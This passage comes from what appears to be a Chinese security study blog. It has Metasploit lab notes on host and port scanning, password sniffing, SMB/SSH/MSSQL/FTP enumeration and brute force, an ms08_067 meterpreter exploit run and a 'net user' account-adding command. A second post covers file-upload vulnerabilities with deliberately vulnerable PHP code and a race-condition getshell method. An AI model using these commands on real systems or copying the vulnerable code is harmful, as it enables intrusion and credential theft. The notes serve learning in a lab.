href="#1-db-nmap" class="headerlink" title="1. db_nmap"></a>1. db_nmap</h4><ul><li>跟 nmap 用法一样，结果存放在 msf 的数据库中</li></ul><pre><code>msf &gt; db_nmap -sV 10.10.10.0/24</code></pre><ul><li>auxiliary 目录下</li><li>RHOSTS &lt;&gt; RHOST<ul><li>192.168.1.20-192.168.1.30、192.168.1.0/24,192.168.11.0/24</li><li>也可以编写地址列表：file:/root/h.txt</li></ul></li></ul><h4 id="2-主机发现扫描"><a href="#2-主机发现扫描" class="headerlink" title="2.主机发现扫描"></a>2.主机发现扫描</h4><ul><li>use auxiliary/scanner/discovery/arp_sweep</li><li>set INTERFACE、RHOSTS、SHOST、SMAC、THREADS；run</li></ul><pre><code>msf &gt; search arpmsf &gt; use auxiliary/scanner/discovery/arp_sweepmsf auxiliary(scanner/discovery/arp_sweep) &gt; show options msf auxiliary(scanner/discovery/arp_sweep) &gt; set RHOSTS 10.10.10.0/24msf auxiliary(scanner/discovery/arp_sweep) &gt; set INTERFACE eth0msf auxiliary(scanner/discovery/arp_sweep) &gt; set THREADS 20msf auxiliary(scanner/discovery/arp_sweep) &gt; run</code></pre><h4 id="3-端口扫描"><a href="#3-端口扫描" class="headerlink" title="3.端口扫描"></a>3.端口扫描</h4><ul><li>use auxiliary/scanner/portscan/syn</li><li>set INTERFACE、PORTS、RHOSTS、THREADS；run</li></ul><pre><code>msf &gt; search portscanmsf &gt; use auxiliary/scanner/portscan/synmsf auxiliary(scanner/portscan/syn) &gt; show options msf auxiliary(scanner/portscan/syn) &gt; set INTERFACE eth0msf auxiliary(scanner/portscan/syn) &gt; set PORTS 80msf auxiliary(scanner/portscan/syn) &gt; set RHOSTS 10.10.10.0/24msf auxiliary(scanner/portscan/syn) &gt; set THREADS 50msf auxiliary(scanner/portscan/syn) &gt; run</code></pre><h4 id="4-僵尸扫描"><a href="#4-僵尸扫描" class="headerlink" title="4.僵尸扫描"></a>4.僵尸扫描</h4><ul><li>查找 ipidseq 主机（查找僵尸机）<ul><li>use auxiliary/scanner/ip/ipidseq</li><li>set RHOSTS 192.168.1.0/24 ；run</li><li>nmap -PN -sI 10.10.10.147 10.10.10.132</li></ul></li></ul><pre><code>msf &gt; use auxiliary/scanner/ip/ipidseqmsf auxiliary(scanner/ip/ipidseq) &gt; show options msf auxiliary(scanner/ip/ipidseq) &gt; set RHOSTS 10.10.10.100-150msf auxiliary(scanner/ip/ipidseq) &gt; set THREADS 20msf auxiliary(scanner/ip/ipidseq) &gt; run</code></pre><pre><code>msf &gt; db_nmap -PN -sI 10.10.10.147 10.10.10.132</code></pre><h4 id="5-UDP扫描"><a href="#5-UDP扫描" class="headerlink" title="5.UDP扫描"></a>5.UDP扫描</h4><ul><li>use auxiliary/scanner/discovery/udp_sweep</li><li>use auxiliary/scanner/discovery/udp_probe</li></ul><pre><code>msf &gt; use auxiliary/scanner/discovery/udp_sweepmsf auxiliary(scanner/discovery/udp_sweep) &gt; show options msf auxiliary(scanner/discovery/udp_sweep) &gt; set RHOSTS 10.10.10.100-150msf auxiliary(scanner/discovery/udp_sweep) &gt; run</code></pre><pre><code>msf &gt; use auxiliary/scanner/discovery/udp_probemsf auxiliary(scanner/discovery/udp_probe) &gt; show options msf auxiliary(scanner/discovery/udp_probe) &gt; set RHOSTS 10.10.10.100-150msf auxiliary(scanner/discovery/udp_probe) &gt; set CHOST 10.10.10.131msf auxiliary(scanner/discovery/udp_probe) &gt; set THREADS 20msf auxiliary(scanner/discovery/udp_probe) &gt; run</code></pre><h4 id="6-密码嗅探"><a href="#6-密码嗅探" class="headerlink" title="6.密码嗅探"></a>6.密码嗅探</h4><ul><li>use auxiliary/sniffer/psnuffle</li><li>支持从 pacap 抓包文件中提取密码</li><li>功能类似于 dsniff</li><li>目前只支持 pop3、imap、ftp、HTTP GET 协议</li></ul><pre><code>msf &gt; search sniffermsf &gt; use auxiliary/sniffer/psnufflemsf auxiliary(sniffer/psnuffle) &gt; show options msf auxiliary(sniffer/psnuffle) &gt; set INTERFACE eth0msf auxiliary(sniffer/psnuffle) &gt; run</code></pre><pre><code>root@kali:~# ftp 10.10.10.148</code></pre><pre><code># 继续上述msf auxiliary(sniffer/psnuffle) &gt; show optionsmsf auxiliary(sniffer/psnuffle) &gt; set PCAPFILE /root/ftp.pcapngmsf auxiliary(sniffer/psnuffle) &gt; jobsmsf auxiliary(sniffer/psnuffle) &gt; kill 0msf auxiliary(sniffer/psnuffle) &gt; run</code></pre><h4 id="7-SNMP扫描"><a href="#7-SNMP扫描" class="headerlink" title="7.SNMP扫描"></a>7.SNMP扫描</h4><ul><li>vim /etc/snmp/snmpd.conf （侦听复制修改为 0.0.0.0：161）</li><li>use auxiliary/scanner/snmp/snmp_login</li><li>use auxiliary/scanner/snmp/snmp_enum</li><li>use auxiliary/scanner/snmp/snmp_enumusers （windows）</li><li>use auxiliary/scanner/snmp/snmp_enumshares （windows）</li></ul><pre><code>msf &gt; use auxiliary/scanner/snmp/snmp_loginmsf auxiliary(scanner/snmp/snmp_login) &gt; show options msf auxiliary(scanner/snmp/snmp_login) &gt; set RHOSTS 10.10.10.149msf auxiliary(scanner/snmp/snmp_login) &gt; set THREADS 20msf auxiliary(scanner/snmp/snmp_login) &gt; run</code></pre><pre><code>msf &gt; use auxiliary/scanner/snmp/snmp_enummsf auxiliary(scanner/snmp/snmp_enum) &gt; show options msf auxiliary(scanner/snmp/snmp_enum) &gt; set RHOSTS 10.10.10.149msf auxiliary(scanner/snmp/snmp_enum) &gt; run</code></pre><pre><code>msf &gt; use auxiliary/scanner/snmp/snmp_enummsf auxiliary(scanner/snmp/snmp_enum) &gt; show options msf auxiliary(scanner/snmp/snmp_enum) &gt; set RHOSTS 10.10.10.142 （windows）msf auxiliary(scanner/snmp/snmp_enum) &gt; runmsf auxiliary(scanner/snmp/snmp_enum) &gt; set COMMUNITY jlcssadmin （SNMP 服务器团体名）msf auxiliary(scanner/snmp/snmp_enum) &gt; set THREADS 20msf auxiliary(scanner/snmp/snmp_enum) &gt; run</code></pre><pre><code>msf &gt; use auxiliary/scanner/snmp/snmp_enumusersmsf auxiliary(scanner/snmp/snmp_enumusers) &gt; show options msf auxiliary(scanner/snmp/snmp_enumusers) &gt; set COMMUNITY jlcssadminmsf auxiliary(scanner/snmp/snmp_enumusers) &gt; set RHOSTS 10.10.10.142msf auxiliary(scanner/snmp/snmp_enumusers) &gt; run</code></pre><pre><code>msf &gt; use auxiliary/scanner/snmp/snmp_enumsharesmsf auxiliary(scanner/snmp/snmp_enumshares) &gt; show options msf auxiliary(scanner/snmp/snmp_enumshares) &gt; set COMMUNITY jlcssadminmsf auxiliary(scanner/snmp/snmp_enumshares) &gt; set RHOSTS 10.10.10.142msf auxiliary(scanner/snmp/snmp_enumshares) &gt; run</code></pre><h4 id="8-SMB扫描"><a href="#8-SMB扫描" class="headerlink" title="8.SMB扫描"></a>8.SMB扫描</h4><ul><li>SMB 版本扫描<ul><li>use auxiliary/scanner/smb/smb_version</li></ul></li><li>扫描命令管道。判断 SMB 服务类型（账号、密码）<ul><li>use auxiliary/scanner/smb/pipe_auditor</li></ul></li><li>扫描通过 SMB 管道可以访问的 RCERPC 服务<ul><li>use auxiliary/scanner/smb/pipe_dcerpc_auditor</li></ul></li><li>SMB 共享账号（账号、密码）<ul><li>use auxiliary/scanner/smb/smb_enumshares</li></ul></li><li>SMB 用户枚举（账号、密码）<ul><li>use auxiliary/scanner/smb/smb_enumusers</li></ul></li><li>SID 枚举（账号、密码）<ul><li>use auxiliary/scanner/smb/smb_lookupsid</li></ul></li><li>SMB 版本扫描</li></ul><pre><code>msf &gt; search smbmsf &gt; use auxiliary/scanner/smb/smb_versionmsf auxiliary(scanner/smb/smb_version) &gt; show options msf auxiliary(scanner/smb/smb_version) &gt; set RHOSTS 10.10.10.147, 10.10.10.148, 10.10.10.142msf auxiliary(scanner/smb/smb_version) &gt; run</code></pre><pre><code># 继续上述msf auxiliary(scanner/smb/smb_version) &gt; set SMBUSER Administratormsf auxiliary(scanner/smb/smb_version) &gt; set SMBPass 123456msf auxiliary(scanner/smb/smb_version) &gt; run</code></pre><ul><li>扫描命令管道。判断 SMB 服务类型（账号、密码）</li></ul><pre><code>msf &gt; use auxiliary/scanner/smb/pipe_auditormsf auxiliary(scanner/smb/pipe_auditor) &gt; show options msf auxiliary(scanner/smb/pipe_auditor) &gt; set RHOSTS 10.10.10.148msf auxiliary(scanner/smb/pipe_auditor) &gt; run</code></pre><pre><code># 继续上述msf auxiliary(scanner/smb/pipe_auditor) &gt; set SMBUser Administratormsf auxiliary(scanner/smb/pipe_auditor) &gt; set SMBPass 123456</code></pre><ul><li>扫描通过 SMB 管道可以访问的 RCERPC 服务</li></ul><pre><code>msf &gt; use auxiliary/scanner/smb/pipe_dcerpc_auditormsf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; show options msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; set RHOSTS 10.10.10.148msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; run</code></pre><pre><code># 继续上述msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; set SMBUser Administratormsf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; set SMBPass 123456msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; run</code></pre><ul><li>SMB 共享账号（账号、密码）</li></ul><pre><code>msf &gt; use auxiliary/scanner/smb/smb_enumsharesmsf auxiliary(scanner/smb/smb_enumshares) &gt; show options msf auxiliary(scanner/smb/smb_enumshares) &gt; set RHOSTS 10.10.10.148msf auxiliary(scanner/smb/smb_enumshares) &gt; run</code></pre><pre><code># 继续上述msf auxiliary(scanner/smb/smb_enumshares) &gt; set SMBUser Administratormsf auxiliary(scanner/smb/smb_enumshares) &gt; set SMBPass 123456msf auxiliary(scanner/smb/smb_enumshares) &gt; run</code></pre><ul><li>SMB 用户枚举（账号、密码）</li></ul><pre><code>msf &gt; use auxiliary/scanner/smb/smb_enumusersmsf auxiliary(scanner/smb/smb_enumusers) &gt; show options msf auxiliary(scanner/smb/smb_enumusers) &gt; set RHOSTS 10.10.10.148msf auxiliary(scanner/smb/smb_enumusers) &gt; run</code></pre><pre><code># 继续上述msf auxiliary(scanner/smb/smb_enumusers) &gt; set SMBUser Administratormsf auxiliary(scanner/smb/smb_enumusers) &gt; set SMBPass 123456msf auxiliary(scanner/smb/smb_enumusers) &gt; run</code></pre><ul><li>SID 枚举（账号、密码）</li></ul><pre><code>msf &gt; use auxiliary/scanner/smb/smb_lookupsidmsf auxiliary(scanner/smb/smb_lookupsid) &gt; show options msf auxiliary(scanner/smb/smb_lookupsid) &gt; set RHOSTS 10.10.10.148</code></pre><pre><code># 继续上述msf auxiliary(scanner/smb/smb_lookupsid) &gt; set SMBUser Administratormsf auxiliary(scanner/smb/smb_lookupsid) &gt; set SMBPass 123456msf auxiliary(scanner/smb/smb_lookupsid) &gt; run</code></pre><h4 id="SSH扫描"><a href="#SSH扫描" class="headerlink" title="SSH扫描"></a>SSH扫描</h4><ul><li>SSH 版本扫描<ul><li>use auxiliary/scanner/ssh/ssh_version</li></ul></li><li>SSH 密码爆破<ul><li>use auxiliary/scanner/ssh/ssh_login<ul><li>set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt ；set VERBOSE false ；run</li></ul></li></ul></li><li>SSH 公钥登陆<ul><li>use auxiliary/scanner/ssh/ssh_login_pubkey<ul><li>set KEY_FILE id_rsa；set USERNAME root ；run</li></ul></li></ul></li><li>SSH 版本扫描</li></ul><pre><code>msf &gt; use auxiliary/scanner/ssh/ssh_versionmsf auxiliary(scanner/ssh/ssh_version) &gt; set RHOSTS 10.10.10.132msf auxiliary(scanner/ssh/ssh_version) &gt; run</code></pre><ul><li>SSH 密码爆破</li></ul><pre><code>root@kali:~# more /usr/share/metasploit-framework/data/wordlists/root_userpass.txt msf &gt; use auxiliary/scanner/ssh/ssh_loginmsf auxiliary(scanner/ssh/ssh_login) &gt; set RHOSTS 10.10.10.132msf auxiliary(scanner/ssh/ssh_login) &gt; set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txtmsf auxiliary(scanner/ssh/ssh_login) &gt; set VERBOSE false msf auxiliary(scanner/ssh/ssh_login) &gt; run</code></pre><ul><li>SSH 公钥登陆</li></ul><pre><code>msf &gt; use auxiliary/scanner/ssh/ssh_login_pubkeymsf auxiliary(scanner/ssh/ssh_login_pubkey) &gt; set RHOSTS 10.10.10.132msf auxiliary(scanner/ssh/ssh_login_pubkey) &gt; set USERNAME rootmsf auxiliary(scanner/ssh/ssh_login_pubkey) &gt; set KEY_PATH id_rsa_test_file</code></pre><h4 id="windows缺少的补丁"><a href="#windows缺少的补丁" class="headerlink" title="windows缺少的补丁"></a>windows缺少的补丁</h4><ul><li><p>基于已经取得的 session 进行检测</p></li><li><p>use post/windows/gather/enum_patches</p><ul><li>show advanced</li><li>set VERBOSE yes</li></ul></li><li><p>检查失败</p><ul><li>known bug in WMI query, try migrating to another process</li><li>迁移到另一个进程再次进行尝试</li></ul></li><li><p>ms08-067</p></li></ul><pre><code>msf &gt; use exploit/windows/smb/ms08_067_netapimsf exploit(windows/smb/ms08_067_netapi) &gt; set RHOST 10.10.10.147msf exploit(windows/smb/ms08_067_netapi) &gt; set payload windows/meterpreter/reverse_tcpmsf exploit(windows/smb/ms08_067_netapi) &gt; run</code></pre><p><img src="https://i.imgur.com/oXOv9u8.png" alt="img"></p><pre><code>meterpreter &gt; backgrounmsf exploit(windows/smb/ms08_067_netapi) &gt; sessions </code></pre><p><img src="https://i.imgur.com/5eADIeS.png" alt="img"></p><pre><code>msf exploit(windows/smb/ms08_067_netapi) &gt; use post/windows/gather/enum_patchesmsf post(windows/gather/enum_patches) &gt; set SESSION 4msf post(windows/gather/enum_patches) &gt; run</code></pre><p><img src="https://i.imgur.com/VEpQ5Ut.png" alt="img"></p><pre><code># 进程错误，迁移进程msf post(windows/gather/enum_patches) &gt; sessions -i 4meterpreter &gt; getpidmeterpreter &gt; psmeterpreter &gt; migrate 828  # spoolsv.exemeterpreter &gt; background msf post(windows/gather/enum_patches) &gt; run</code></pre><p><img src="https://i.imgur.com/DCfpDji.png" alt="img"></p><h4 id="mssql-扫描"><a href="#mssql-扫描" class="headerlink" title="mssql 扫描"></a>mssql 扫描</h4><ul><li><p>mssql 扫描端口</p><ul><li>TCP 1422（动态端口）/ UDP 1434 （查询 TCP 端口号）</li><li>use auxiliary/scanner/mssql/mssql_ping</li></ul></li><li><p>爆破 mssql 密码</p></li><li><p>use auxiliary/scanner/mssql/mssql_login</p></li><li><p>远程执行代码（获取数据库权限之后）</p></li><li><p>use auxiliary/admin/mssql/mssql_exec</p><ul><li>set CMD net user user1 pass123 /ADD</li></ul></li><li><p>mssql扫描端口</p></li></ul><pre><code>msf &gt; use auxiliary/scanner/mssql/mssql_pingmsf auxiliary(scanner/mssql/mssql_ping) &gt; set RHOSTS 10.10.10.142msf auxiliary(scanner/mssql/mssql_ping) &gt; run</code></pre><h4 id="FTP扫描"><a href="#FTP扫描" class="headerlink" title="FTP扫描"></a>FTP扫描</h4><ul><li><p>ftp 版本扫描</p><ul><li>use auxiliary/scanner/ftp/ftp_version</li><li>use auxiliary/scanner/ftp/anonymous</li><li>use auxiliary/scanner/ftp/ftp_login</li></ul></li><li><p>use auxiliary/scanner/ [tab]</p></li><li><p>Display all 479 possibilities? (y or n)</p></li><li><p>查询版本信息</p></li></ul><pre><code>msf &gt; use auxiliary/scanner/ftp/ftp_versionmsf (scanner/ftp/ftp_version) &gt; set RHOSTS 10.10.10.132msf auxiliary(scanner/ftp/ftp_version) &gt; run</code></pre><p><img src="https://i.imgur.com/HZ8JVfi.png" alt="img"></p><ul><li><p>是否允许匿名登录</p><pre><code>msf &gt; use auxiliary/scanner/ftp/anonymousmsf auxiliary(scanner/ftp/anonymous) &gt; set RHOSTS 10.10.10.132msf auxiliary(scanner/ftp/anonymous) &gt; run</code></pre></li></ul><p><img src="https://i.imgur.com/A6Ms8B3.png" alt="img"></p><ul><li><p>暴力破解</p><pre><code>use auxiliary/scanner/ftp/ftp_login</code></pre></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>文件上传漏洞学习</title>
      <link href="/2020/04/03/wen-jian-shang-chuan-lou-dong-xue-xi-bi-ji/"/>
      <url>/2020/04/03/wen-jian-shang-chuan-lou-dong-xue-xi-bi-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="文件上传漏洞学习笔记-靶场实战"><a href="#文件上传漏洞学习笔记-靶场实战" class="headerlink" title="文件上传漏洞学习笔记+靶场实战"></a>文件上传漏洞学习笔记+靶场实战</h1><h4 id="一-什么是文件上传漏洞"><a href="#一-什么是文件上传漏洞" class="headerlink" title="一.什么是文件上传漏洞"></a>一.什么是文件上传漏洞</h4><p>  文件上传<a href="http://www.2cto.com/" target="_blank" rel="noopener">漏洞</a>是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。这种攻击方式是最为直接和有效的.</p><p><strong>关于PHP中$_FILES数组的使用方法</strong></p><pre><code>$_FILES\[‘file’][‘name’] 客户端文件名称$_FILES\[‘file’][‘type’] 文件的MIME类型$_FILES\[‘file’][‘size’] 文件大小 单位字节$_FILES\[‘file’][‘tmp_name’] 文件被上传后在服务器端临时文件名，可以在php.ini中指定</code></pre><p>需要注意的是在文件上传结束后，默认的被储存在临时文件夹中，这时必须把他从临时目录中删除或移动到其他地方，否则，脚本运行完毕后，自动删除临时文件，可以使用copy或者<code>move_uploaded_file</code>两个函数</p><h5 id="文件上传中常见的函数错误"><a href="#文件上传中常见的函数错误" class="headerlink" title="文件上传中常见的函数错误"></a>文件上传中常见的函数错误</h5><p><strong>这些函数有:<code>empty()、isset()、strpos()、rename()</code>等，如下面的代码:</strong></p><pre><code>#!phpif($operateId == 1){    $date = date(&quot;Ymd&quot;);    $dest = $CONFIG-&gt;basePath.&quot;data/files/&quot;.$date.&quot;/&quot;;    $COMMON-&gt;createDir($dest);    //if (!is_dir($dest))   mkdir($dest, 0777);    $nameExt = strtolower($COMMON-&gt;getFileExtName($_FILES[&#39;Filedata&#39;][&#39;name&#39;]));    $allowedType = array(&#39;jpg&#39;, &#39;gif&#39;, &#39;bmp&#39;, &#39;png&#39;, &#39;jpeg&#39;);    if(!in_array($nameExt, $allowedType)){        $msg = 0;    }    if(empty($msg)){        $filename = getmicrotime().&#39;.&#39;.$nameExt;        $file_url = urlencode($CONFIG-&gt;baseUrl.&#39;data/files/&#39;.$date.&quot;/&quot;.$filename);        $filename = $dest.$filename;        if(empty($_FILES[&#39;Filedata&#39;][&#39;error&#39;])){            move_uploaded_file($_FILES[&#39;Filedata&#39;][&#39;tmp_name&#39;],$filename);        }        if (file_exists($filename)){            //$msg = 1;            $msg = $file_url;            @chmod($filename, 0444);        }else{            $msg = 0;        }    }    $outMsg = &quot;fileUrl=&quot;.$msg;    $_SESSION[&quot;eoutmsg&quot;] = $outMsg;    exit;}</code></pre><h4 id="历史经典漏洞再次爆发"><a href="#历史经典漏洞再次爆发" class="headerlink" title="历史经典漏洞再次爆发"></a>历史经典漏洞再次爆发</h4><p>条件竞争漏洞,这类历史经典漏洞在逐渐淡出人们视线的时候,再次爆发..</p><p>接着看下面这段代码(摘自某VPN系统)</p><pre class=" language-php"><code class="language-php"><span class="token shell-comment comment">#!php</span><span class="token delimiter">&lt;?</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'realfile'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">copy</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'realfile'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">mb_convert_encoding</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>file<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"GBK"</span><span class="token punctuation">,</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Pragma:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Cache-Control:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-type:application/octet-stream"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-Length:"</span><span class="token punctuation">.</span><span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>path<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-Disposition:attachment;filename=\"$file\""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>path<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'realfile'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"path"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>上述代码的逻辑表面上看起来是这样的(对于攻击者来说)：</p><p>利用copy函数，将realfile生成shell.php-→删除掉shell.php</p><p>这样初看起来没办法利用，但是仔细一想, 这段代码其实是存在逻辑问题的，所以我们可以利用这个逻辑缺陷达到GetShell的目的。</p><p>具体利用方法：</p><p>copy成temp.php–&gt;不断访问temp.php-&gt;temp.php生成shell.php-&gt;删除temp.php</p><h4 id="校验方式分类-amp-总结"><a href="#校验方式分类-amp-总结" class="headerlink" title="校验方式分类&amp;总结"></a>校验方式分类&amp;总结</h4><ul><li>客户端javascript校验（一般只校验后缀名）</li><li>服务端校验</li><li>文件头content-type字段校验（image/gif）</li><li>文件内容头校验（GIF89a）</li><li>后缀名黑名单校验</li><li>后缀名白名单校验</li><li>自定义正则校验</li><li>WAF设备校验（根据不同的WAF产品而定）</li></ul><h4 id="校验方式溯源"><a href="#校验方式溯源" class="headerlink" title="校验方式溯源"></a>校验方式溯源</h4><p>​    通常一个文件以HTTP协议进行上传时，将以POST请求发送至Web服务器，Web服务器接收到请求并同意后，用户与Web服务器将建立连接，并传输数据。一般文件上传过程中将会经过如下几个检测步骤：</p><p><img src="https://images.seebug.org/content/images/2018/04/523aeb43-b1a1-421b-b809-79ec1bdb06f8.png-w331s" alt="img"></p><h4 id="校验方式-amp-绕过姿势"><a href="#校验方式-amp-绕过姿势" class="headerlink" title="校验方式&amp;绕过姿势"></a>校验方式&amp;绕过姿势</h4><h5 id="PUT方法"><a href="#PUT方法" class="headerlink" title="PUT方法"></a>PUT方法</h5><p>WebDAV是一种基于 HTTP 1.1协议的通信协议.它扩展了HTTP 1.1，在GET、POST、HEAD等几个HTTP标准方法以外添加了一些新的方法。使应用程序可直接对Web Server直接读写，并支持写文件锁定(Locking)及解锁(Unlock)，还可以支持文件的版本控制。当WebDAV开启PUT，MOVE，COPY，DELETE方法时，攻击者就可以向服务器上传危险脚本文件。</p><p>此时可以使用OPTIONS探测服务器支持的http方法，如果支持PUT，就进行上传脚本文件，在通过MOVE或COPY方法改名。当开启DELETE时还可以删除文件。</p><p>参考:<a href="http://wiki.wooyun.org/server:httpput" target="_blank" rel="noopener">http://wiki.wooyun.org/server:httpput</a></p><h4 id="客户端校验"><a href="#客户端校验" class="headerlink" title="客户端校验"></a>客户端校验</h4><h5 id="JavaScript校验"><a href="#JavaScript校验" class="headerlink" title="JavaScript校验"></a>JavaScript校验</h5><p>验证代码</p><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">?</span>php<span class="token comment" spellcheck="true">//文件上传漏洞演示脚本之js验证</span>$uploaddir <span class="token operator">=</span> <span class="token string">'uploads/'</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span>$uploaddir<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span>$_FILES<span class="token punctuation">[</span><span class="token string">'upfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> $uploaddir <span class="token punctuation">.</span> <span class="token string">'/'</span> <span class="token punctuation">.</span> $_FILES<span class="token punctuation">[</span><span class="token string">'upfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            echo <span class="token string">'文件上传成功，保存于：'</span> <span class="token punctuation">.</span> $uploaddir <span class="token punctuation">.</span> $_FILES<span class="token punctuation">[</span><span class="token string">'upfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token function">exit</span><span class="token punctuation">(</span>$uploaddir <span class="token punctuation">.</span> <span class="token string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//print_r($_FILES);</span><span class="token punctuation">}</span><span class="token operator">?</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE html PUBLIC <span class="token string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span>    <span class="token string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span><span class="token operator">></span><span class="token operator">&lt;</span>html xmlns<span class="token operator">=</span><span class="token string">"http://www.w3.org/1999/xhtml"</span><span class="token operator">></span><span class="token operator">&lt;</span>head<span class="token operator">></span>    <span class="token operator">&lt;</span>meta http<span class="token operator">-</span>equiv<span class="token operator">=</span><span class="token string">"Content-Type"</span> content<span class="token operator">=</span><span class="token string">"text/html;charset=gbk"</span><span class="token operator">/</span><span class="token operator">></span>    <span class="token operator">&lt;</span>meta http<span class="token operator">-</span>equiv<span class="token operator">=</span><span class="token string">"content-language"</span> content<span class="token operator">=</span><span class="token string">"zh-CN"</span><span class="token operator">/</span><span class="token operator">></span>    <span class="token operator">&lt;</span>title<span class="token operator">></span>文件上传漏洞演示脚本<span class="token operator">--</span>JS验证实例<span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">></span>    <span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">></span>       <span class="token keyword">function</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">var</span> file <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByName</span><span class="token punctuation">(</span><span class="token string">'upfile'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>file <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> file <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"你还没有选择任何文件，不能上传!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">//定义允许上传的文件类型</span>            <span class="token keyword">var</span> allow_ext <span class="token operator">=</span> <span class="token string">".jpg|.jpeg|.png|.gif|.bmp|"</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//提取上传文件的类型</span>            <span class="token keyword">var</span> ext_name <span class="token operator">=</span> file<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//alert(ext_name);</span>            <span class="token comment" spellcheck="true">//alert(ext_name + "|");</span>            <span class="token comment" spellcheck="true">//判断上传文件类型是否允许上传</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>allow_ext<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>ext_name <span class="token operator">+</span> <span class="token 